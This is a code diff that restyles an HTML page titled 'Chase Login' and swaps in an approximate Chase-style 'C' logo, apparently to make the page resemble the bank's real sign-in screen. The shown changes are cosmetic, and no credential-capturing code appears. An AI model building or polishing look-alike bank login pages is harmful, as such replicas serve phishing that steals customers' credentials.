@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CHASE Login</title>
+<title>Chase Login with Approx Logo</title>
 <style>
 body {
 margin: 0;
@@ -15,23 +15,21 @@ background-color: #0a2540;
 font-family: Arial, sans-serif;
 color: white;
 }
-
 .logo {
 display: flex;
 align-items: center;
-font-size: 72px;
+font-size: 64px;
 font-weight: bold;
-margin-bottom: 40px;
+letter-spacing: 4px;
+margin-bottom: 30px;
 }
-
 .logo svg {
-width: 80px;
-height: 80px;
-margin-right: 10px;
+width: 90px;
+height: 90px;
+margin-right: 12px;
 }
-
 .container {
-background: white;
+background: #fff;
 padding: 30px 40px;
 border-radius: 8px;
 width: 360px;
@@ -39,28 +37,24 @@ box-shadow: 0 0 15px rgba(0,0,0,0.3);
 text-align: center;
 color: #333;
 }
-
 input[type="text"], input[type="password"] {
 width: 100%;
-padding: 10px 12px;
+padding: 10px;
 margin: 8px 0;
 border: 1px solid #ccc;
 border-radius: 4px;
 }
-
 .options {
 display: flex;
 justify-content: space-between;
-margin: 15px 0;
 font-size: 14px;
+margin-top: 12px;
 }
-
 .options label {
 display: flex;
 align-items: center;
 gap: 5px;
 }
-
 button {
 width: 100%;
 padding: 10px;
@@ -70,8 +64,8 @@ border: none;
 border-radius: 4px;
 cursor: pointer;
 font-weight: bold;
+margin-top: 15px;
 }
-
 button:hover {
 background-color: #003366;
 }
@@ -80,9 +74,28 @@ background-color: #003366;
 <body>
 
 <div class="logo">
-<!-- DRAWN Chase C SVG -->
-<svg viewBox="0 0 100 100">
-<path d="M10,50 a40,40 0 1,1 80,0 a32,32 0 1,0 -64,0" fill="white"/>
+<!-- Approximate Chase‑style “C” -->
+<svg viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+<path fill="#fff" d="
+M60,0
+L110,0
+L120,10
+L120,50
+L100,50
+L100,20
+L80,20
+L80,40
+L60,40
+Z
+M0,50
+L0,100
+L60,100
+L60,80
+L20,80
+L20,60
+L60,60
+Z
+"/>
 </svg>
 HASE
 </div>
